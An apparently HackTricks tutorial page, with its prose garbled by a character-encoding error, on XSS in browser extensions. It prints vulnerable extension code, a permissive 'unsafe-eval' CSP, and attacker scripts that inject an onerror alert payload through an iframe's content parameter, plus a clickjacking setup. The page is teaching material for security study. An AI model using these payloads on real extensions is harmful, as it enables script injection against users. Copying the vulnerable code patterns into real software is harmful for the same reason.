# BrowExt - –ü—Ä–∏–∫–ª–∞–¥ XSS

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

## –ú—ñ–∂—Å–∞–π—Ç–æ–≤–∏–π —Å–∫—Ä–∏–ø—Ç—ñ–Ω–≥ (XSS) —á–µ—Ä–µ–∑ Iframe

–£ —Ü—å–æ–º—É –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ **—Å–∫—Ä–∏–ø—Ç –≤–º—ñ—Å—Ç—É** —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è Iframe, –≤–∫–ª—é—á–∞—é—á–∏ URL –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ –∑–∞–ø–∏—Ç—É —è–∫ –¥–∂–µ—Ä–µ–ª–æ Iframe:
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
–ù–∞ –ø—É–±–ª—ñ—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω—ñ–π HTML-—Å—Ç–æ—Ä—ñ–Ω—Ü—ñ, **`message.html`**, —Ä–æ–∑—Ä–æ–±–ª–µ–Ω–æ –¥–ª—è –¥–∏–Ω–∞–º—ñ—á–Ω–æ–≥–æ –¥–æ–¥–∞–≤–∞–Ω–Ω—è –≤–º—ñ—Å—Ç—É –¥–æ —Ç—ñ–ª–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ —É URL:
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
–ó–ª–æ–≤–º–∏—Å–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –ø—Ä–æ—Ç–∏–≤–Ω–∏–∫–∞, –∑–º—ñ–Ω—é—é—á–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä `content` –¥–∂–µ—Ä–µ–ª–∞ Iframe, —â–æ–± –≤–≤–µ—Å—Ç–∏ **XSS payload**. –¶–µ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è –æ–Ω–æ–≤–ª–µ–Ω–Ω—è–º –¥–∂–µ—Ä–µ–ª–∞ Iframe, —â–æ–± –≤–∫–ª—é—á–∏—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π —Å–∫—Ä–∏–ø—Ç:
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
–ù–∞–¥–º—ñ—Ä–Ω–æ –¥–æ–∑–≤—ñ–ª—å–Ω–∞ –ø–æ–ª—ñ—Ç–∏–∫–∞ –±–µ–∑–ø–µ–∫–∏ –∫–æ–Ω—Ç–µ–Ω—Ç—É, —Ç–∞–∫–∞ —è–∫:
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
–¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è JavaScript, —â–æ —Ä–æ–±–∏—Ç—å —Å–∏—Å—Ç–µ–º—É –≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–æ –∞—Ç–∞–∫ XSS.

–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–π –ø—ñ–¥—Ö—ñ–¥ –¥–ª—è –≤–∏–∫–ª–∏–∫—É XSS –ø–æ–ª—è–≥–∞—î –≤ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ –µ–ª–µ–º–µ–Ω—Ç–∞ Iframe —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ñ –π–æ–≥–æ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ —Å–∫—Ä–∏–ø—Ç—É —è–∫ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `content`:
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM-–±–∞–∑–æ–≤–∏–π XSS + ClickJacking

–¶–µ–π –ø—Ä–∏–∫–ª–∞–¥ –±—É–≤ –≤–∑—è—Ç–∏–π –∑ [–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ –ø–æ—Å—Ç—É](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/).

–û—Å–Ω–æ–≤–Ω–∞ –ø—Ä–æ–±–ª–µ–º–∞ –≤–∏–Ω–∏–∫–∞—î –∑ —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ DOM-–±–∞–∑–æ–≤–∞–Ω–æ–≥–æ –º—ñ–∂—Å–∞–π—Ç–æ–≤–æ–≥–æ —Å–∫—Ä–∏–ø—Ç—ñ–Ω–≥—É (XSS), —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–æ—ó –≤ **`/html/bookmarks.html`**. –ü—Ä–æ–±–ª–µ–º–Ω–∏–π JavaScript, —á–∞—Å—Ç–∏–Ω–∞ **`bookmarks.js`**, –¥–µ—Ç–∞–ª—å–Ω–æ –æ–ø–∏—Å–∞–Ω–∏–π –Ω–∏–∂—á–µ:
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
–¶–µ–π —É—Ä–∏–≤–æ–∫ –æ—Ç—Ä–∏–º—É—î **–∑–Ω–∞—á–µ–Ω–Ω—è** –∑ –ø–æ–ª—è –≤–≤–µ–¥–µ–Ω–Ω—è **`txtName`** —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–∫–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—é —Ä—è–¥–∫—ñ–≤ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó HTML**, —è–∫–µ –ø–æ—Ç—ñ–º –¥–æ–¥–∞—î—Ç—å—Å—è –¥–æ DOM –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `.append()` jQuery.

–ó–∞–∑–≤–∏—á–∞–π –ø–æ–ª—ñ—Ç–∏–∫–∞ –±–µ–∑–ø–µ–∫–∏ –≤–º—ñ—Å—Ç—É (CSP) —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Chrome –º–æ–≥–ª–∞ –± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ —Ç–∞–∫–∏–º –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º. –û–¥–Ω–∞–∫ —á–µ—Ä–µ–∑ **—Ä–æ–∑—Å–ª–∞–±–ª–µ–Ω–Ω—è CSP –∑ 'unsafe-eval'** —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–µ—Ç–æ–¥—ñ–≤ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è DOM jQuery (—è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å [`globalEval()`](https://api.jquery.com/jquery.globaleval/) –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ —Å–∫—Ä–∏–ø—Ç—ñ–≤ –¥–æ [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) –ø—Ä–∏ –≤—Å—Ç–∞–≤—Ü—ñ –≤ DOM), –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤—Å–µ —â–µ –º–æ–∂–ª–∏–≤–∞.

–•–æ—á–∞ —Ü—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —î –∑–Ω–∞—á—É—â–æ—é, —ó—ó –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –∑–∞–∑–≤–∏—á–∞–π –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ –≤–∑–∞—î–º–æ–¥—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞: –≤—ñ–¥–≤—ñ–¥—É–≤–∞–Ω–Ω—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏, –≤–≤–µ–¥–µ–Ω–Ω—è XSS-–Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—è –∫–Ω–æ–ø–∫–∏ "–î–æ–¥–∞—Ç–∏".

–î–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤—Ç–æ—Ä–∏–Ω–Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å **clickjacking**. –ú–∞–Ω—ñ—Ñ–µ—Å—Ç —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Chrome –ø–æ–∫–∞–∑—É—î —Ä–æ–∑–≥–æ—Ä–Ω—É—Ç—É –ø–æ–ª—ñ—Ç–∏–∫—É `web_accessible_resources`:
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
–ó–æ–∫—Ä–µ–º–∞, —Å—Ç–æ—Ä—ñ–Ω–∫–∞ **`/html/bookmarks.html`** –Ω–∞—Ö–∏–ª—å–Ω–∞ –¥–æ —Ñ—Ä–µ–π–º—ñ–Ω–≥—É, –æ—Ç–∂–µ, –≤—Ä–∞–∑–ª–∏–≤–∞ –Ω–∞ **clickjacking**. –¶—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –¥–ª—è –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –Ω–∞ —Å–∞–π—Ç—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, –Ω–∞–∫–ª–∞–¥–∞—é—á–∏ –Ω–∞ –Ω–µ—ó –µ–ª–µ–º–µ–Ω—Ç–∏ DOM –¥–ª—è –æ–±–º–∞–Ω–ª–∏–≤–æ–≥–æ –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É. –¶—è –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—è –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Ç–æ–≥–æ, —â–æ –∂–µ—Ä—Ç–≤–∏ –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ –≤–∑–∞—î–º–æ–¥—ñ—é—Ç—å –∑ –ø—ñ–¥–ª–µ–≥–ª–∏–º —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
